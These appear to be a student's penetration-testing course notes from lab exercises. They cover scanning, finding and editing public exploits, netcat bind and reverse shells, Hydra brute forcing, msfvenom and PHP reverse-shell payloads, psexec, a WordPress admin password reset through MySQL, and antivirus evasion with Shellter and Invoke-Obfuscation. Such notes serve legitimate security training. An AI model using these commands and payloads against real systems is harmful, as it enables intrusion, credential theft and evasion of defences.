Note: Alot of exploits are found in the other folders too so dont rely on this alone

## Intro

1. Vuln scanning
2. Exploit searching
3. Fixing exploits
4. Bind & reverse shells
5. Exploit Frameworks
6. Windows exploit
7. Linux exploit
8. AV Evasion and Obfuscation


# Vuln scanning
### banner grabbing
- can get service info

Demo:
Some nmap script
`ls -al /usr/share/nmap/scripts/ | grep banner`
`nmap -sV --script=banner <ip>` -> done in -sV

`nc <ip>` -> same stuff but sometimes nmap sV dont work

### nmap scripts
Demo:
`ls -al /usr/share/nmap/scripts |grep http` -> limit to only http scripts

See the documentation on scripts
`nano /usr/share/nmap/scripts/http-enum.nse`

For this demo
`ls -al /usr/share/nmap/scripts |grep shellshock`

`nmap -sV <ip> --script=http-shellshock --script-args="http-shellshock.url=/gettime.cgi"`

### Metasploit

demo:
/smb/smb_ms17_010


## Searching for publicly available exploits

- get code from verified sources (anyone can set a github)
- epxloitDB / Rapid7 

#### ExploitDB
- maintained by a team from kali
- search types/platforms/authors/ports/tags(type of vuln) etc

#### Rapid7
- vetted. Same as before

#### Google Dorks it
- vsftpd site:rapid7.com

#### Data storm
- Info on latest news and new exploits etc

### Searchsploit
- locally available db for exploits
`sudo apt-get update && sudo apt-get install exploitdb -y`

Should update it frequently
`searchsploit -u`

Exploits stored here
`ls -al /usr/share/exploitdb`

`searchsploit vsftpd 2.3.4`
`searchsploit -m 49757` -> get info about the exploit and copies it to ur current dir

Filters like in the exploitdb site:
`searchsploit remote windows smb`


Xtra:
`searchsploit -t vsftpd`
-> search in title

`searchsploit -e "Windows XP" | grep -e "Microsoft Windows XP"
-> exact match

`seachsploit remote windows smb -w | grep -e "EternalBlue"`
-> -w gives the online link to read more about each exploit


## Fixing exploits
- All publicly available exploits need to be edited to suite ur needs

Demo:
rejetto
`searchsploit rejetto`
`searchsploit -m <exploit id>`

Edit the exploit code to use (eg change ip/port)
`vim <exploit.py>`
This exploit needed nc.exe to be hosted on your local server to run on the target

Attacker
`cp /usr/share/windows-resources/binaries/nc.exe`
-> Copy it to the home directory to share 
`python -m SimpleHTTPServer 80`

Attacker (another terminal)
`nc -lvnp 1234`

Attacker (3rd terminal terminal)
`python 29161.py <targetip> 80`

Run a few times.should work
`systeminfo`


### Cross-compiling exploits
- need to compile C/C++ exploit code
- Using Linux to compile windows exploits (cross-compiling)

Demo:
For creating Microsoft Windows portable executables in linux
`sudo apt-get install mingw-w64`

For C code in Linux
`sudo apt-get install gcc`

Note: Better to get the 32bit exploits more compatible

#### If no documentation of how to compile
Compiles to a 64bit executable
`i686-w64-mingw32-gcc 9303.c -o exploit`

Compiles to a 32bit executable
`i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32`

#### Dirty cow exploit
- Has good documentation on how to use/compile
`gcc -pthread 4089.c -o exploit -lcrypt`

Last:
github exploitdb-bin-sploits/bin-sploits has some precompiled binaries if needed


## Bind/Reverse Shells

## Netcat
- located in /usr/share/windows-binaries
- 2 modes:
	- Client mode: Connect to the target directly 
	- Server mode: Listen for connections from the target (-l)
`nc <ip>:<port>`
`nc -lvnp <port>`

Note: 
UDP also possible -u
-v verbose
-n no dns resolution (doesnt change the ip/name to something else)

Uses:
banner grabbing, reverse/bind shells, file transfers

Demo: 
- Chat terminal 
system1:
`nc -lvnp 80`

system2:
`nc -nv <system1 ip> 80`

Works in UDP too o.o but unreliable`
system1:
`nc -lvnup 80`

system2:
`nc -nvu <system1 ip> 80`

Transfer files
system2:
`nc - nv <sys1 ip> 80 < test.txt`


## Bindshells
- Attacker conect to a listener on the target 
Attacker ---(connection req)-----> Target Listener

- Listener can be set to exec /bin/bash or cmd.exe on the client when a client connects
`nc -lnvp 1234 -e cmd.exe`
`nc -lnvp 1234 -e /bin/bash`
`nc -lnvp 1234 -e /bin/sh` --> bash with less features can even use /bin/zsh

On linux
`nc -lnvp 1234 -c /bin/bash` --> can use -e also but c is reserved for linux?

- Attacker
`nc -nv <target ip> 1234` --> the shell should spawn


#### IMPT
- inbound traffic can be blocked by firewall preventing clients to connect (Reverse shell preferred)

Cool: 
`python -m SimpleHTTPServer 80` 
Files can be assesed using the web browser and show the files (basically a web file server) --> usually just curl/certutil/wget

## Reverse Shell
- Target connects to listener on the Attackers system
- IP of attacker is leaked oops

Good stuff:
- Not blocked by firewall
- Can use any sort of client to connect to the listener (can use bash/python/php/powershell script no need nc)
- ^ live off the land , if theres php use php if python use python etc


Attackers listener:
`nc -lnvp 1234`

Target connects as client and launch shell:
`nc -nv <attackers ip> 1234 -e cmd.exe`

## Reverseshell cheat sheet 
- get your payload (clients) to connect to a listener (attacker)

payloadallthings github
revshells.com



# Pentest Frameworks
## Metasploit
- same old
Demo:
- workflow platform v2.5 used
- Default creds tried and got in
- msf mod to get in
- 

## Powershell-Empire
aka Empire
- Primarily for exploit and post exploit only
- for windows targets
- Starkiller (GUI for empire)
- written in many languages (python csharp powershell)


Demo:
`sudo apt-get update && sudo apt-get install powershell-empire starkiller -y`

Startup the backend for empire
`sudo powershell-empire server`

Connect to the API backend
`sudo powershell-empire client`
`listeners`
`aagents`

Navigate to Starkiller app 
Default creds login:
`https://localhost:1337`
empireadmin
password123

# Windows exploitation
Blackbox pentest

1. Scanning
- Found whole bunch of open ports/services
- check the browser for more info

- Do a -T4 -sC -p- scan so all ports and common scripts
- `nmap ...... -oX scanned `
- `db_import scanned` import nmap scan to msfconsole easier

exploiting open ports
#### FTPD
- ftpd ans microsoft IIS open
- means the ftp server is used to allow authed users to modify the web server dir
- ftp is sued to modify/upload/download files onto the web server

Check:
ftp anon access
`nmap .... --script=ftp-anon`
hydra bruteforce
`hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> ftp`

--> found admin logins using bruteforce (administrator::vagrant)
Check to see if thrs a user acct vagrant
`hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> ftp`
Try with different wordlists (using userlist as a passlist lol)
`hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt <ip> ftp -I` 

Login
`ftp <ip> 21`

asp shells allowed on the server so use ftp to transfer msfvenom to generate
`msfvenom -p windows/shell/reverse_tcp LHOST=<myip> LPORT=1234 -f asp >shell.aspx`

On FTP
`put shell.aspx`

#### SSH 
- use previous accounts found
`hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt <ip> ssh` 
`hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <ip> ssh` 

--> only user vagrant can be used
SSH in
`net localgroup administrator` -> see who's part of the admin group

`whoami /priv`


#### SMB
- try previous accounts found
`hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt <ip> smb` 
`hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <ip> smb`

Enumerate smb with creds
`smbclient -L <ip> -U vagrant`
`smbmap -u vagrant -p vagrant -H <ip>`

Enumerate all the user accts
`enum4linux -u vagrant -p vagrant -U <ip>`
msfconsole (same as above)
/smb/smb-enumuser 

Using psexec
`locate psexec.py`
`cp ...python3-impacket/examples/psexec.py . `
`chmod +x psexec.py`
`python3 psexec.py Administrator@<ip>`

--> psexec also available on msfconsole /smb/psexec

XTRA:
Since system run Windowss 2008 and Windows Server 2008 R2
Eternal blue is possible....use msfconsole and exploit straight

cool.  Service exploit vs System exploit


#### MYSQL

- ports scanned 3306,8585
- has MYSQL database and a Apache PHP webserver running
- No available exploits found so best is bf it
Found
root::""
`mysql -u root -p -h 10.0.25.212`

`select * from wp_users;`

Change the admin user password (replace the MD5 hash with that for password123) 
`UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';`

Login to the wordpress admin site
`http://<TARGET-IP>/8585/wordpress/wp-admin`

# Linux Exploitation
Blackbox pentest

My wack at it:
10.0.30.21

dvwa
admin::password

Possible attack vectors
ApacheTomcat 5.5
vsftp 2.3.4
Telnet ??


Apache 8180/admin need creds


Got foothold with 
`ftp <ip> `
default creds:
msfadmin/msfadmin

Found in /etc/hosts
172.17.0.2      d1d6a9361621

/etc/passwd
--> Alot of service accts
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false

cat ssh keys out next(??)  --> cant cat in ftp
cd ~/.ssh
get authorised_keys
get id_rsa --> private key
get id_rsa.pub


Went to get some clue from the vids 👌

Twiki webpage 
found user Peter


Demo answer:
## Enumerate (stumbled on a backdoor)
nmap scan everything -p-

Some unknown open ports 
512,513,514,1524

manual banner grab with nc for all above ports 
`nc -nv <ip> <port>`
All refused connection/disconnect/error
but 1524 returns a root shell....
Turns out it was a bind shell listener on the target


## FTP epxloit

***SMTP service gives a way to get user creds easy***
/smtp/enum_users 
service and user accounts appear. 
Use that to bruteforce the ftp service
/wordlists/unix_passwords.txt

ftp access for
service::service

/var/www is the default dir apache stores its stuff
Find webDav here to upload a php reverse shell
/dav is the only place file upload is permitted
(cause webDav is used to transfer files in a webserver)

`cp /usr/webshells/php/php-reverse-shell.php`
`mv php-reverse-shell.php shell.php`
`vim shell.php`  --> edit the ip/port as needed

`put shell.php`
`nc -lvnp 1234`
on /dav refresh and click shell.php

Reverseshell getted


## Exploiting PHP
PHPmyadmin has a info page to check the version
`<ip>/phpinfo.php`
ver was 5.2.4
php versions 5.3.1< are vulnerable to command line injection

`searchsploit php cgi`  or `searchsploit php 5.2.4`
msfmodule exists for v5.3.12/5.4.2

So need use a python script on exploitDB also given
`searchsploit -m 18836`
`vim 18836` 
-> edit the pwn_code section to execute a php reverse shell 
orignally:
pwn_code="""<?php phpinfo();?>"""

New:
pwn_code="""<?php $sock=fsockopen("IP",1234);exec("/bin/bash -i <&3 >&3 2>&3") ;?>"""

Modify the descriptors if no connection made when payload executed
pwn_code="""<?php $sock=fsockopen("IP",1234);exec("/bin/bash -i <&4 >&4 2>&4") ;?>"""

Execute payload
`python2 18836.py <ip> 80`

## Samba exploit
... very sad didnt find
/smb/smb_version
searchsploit
/samba/usermap_script

session -u 1
Rooted

IMPT note:
Even though vulnerable vsftpd 2.3.4 was used it was patched so cant access
--> lesson is that even if a vuln version is used the admin can patch it

LAMP stack is used
--> Linux, Apache, MySQL, PHP

ass opposed to MEAN
--> MongoDB, Express, Angular, Node.js


# AV Evasion & obfuscation

- evade signature based AV

### AV Detection methods
1. Signature based - get the hash of the executable and compare to known malware
2. Heuristic based - looks for patterns in the code/program calls
3. Behaviour based

### On-disk Evasion techniques
- Obfuscation - reorganise the code
- Encoding - encoding the data then decode later (eg shikata_ga_nai)
- Packing - compile with a new binary structure so new signature is made
- Crypters - encrypt code and decrypt the code in memory (encryption key is with attacker)
### In-Memory Evasion techniques
- Manipualte memory (no writing files into disk)
- Injects payload into process by using various Windows APIs
- Payload executed in memory in seperate thread

### Shellter
Evade windows defender etc
Can still be used on linux using wine
`sudo apt-get install shellter -y`

To install 32-bit packages (by default only 64-bit allowed)
`sudo dpkg --add-architecture i386`

`sudo apt-get install wine32`

`cd /usr/share/windows=resources/shellter`

`sudo wine shellter.exe`

Using shellter to inject code into harmless vncview windows binary
In shellter.exe,
`A` -> auto mode
PE Target: /home/kali/Desktop/AVBypass/vncviewer.exe

stealth mode  Y -> so that exe functions as normal

payload L 
1
--> using meterpreter reverse payload (Listed)
--> for msfvenom payloads choose C  (custom)

LHOST
LPORT

setup msf multi handler

## obfuscate powershell code
Invoke-Obfuscation
github repo

get a powershellreverseshell.txt from revshell.com
clone the repo Invoke-Obfuscation

Getting powershell on linux
`sudo apt-get install powershell -y`
`pwsh`
`Import-Module ./Invoke-Obfuscation.psd1`

back in linux
`Invoke-Obfuscation`
`SET SCRIPTPATH /home/kali/Desktop/AVBypass/revshell.ps1`
ENCODING -> choose the obfuscation method
1  

RESET
AST
ALL

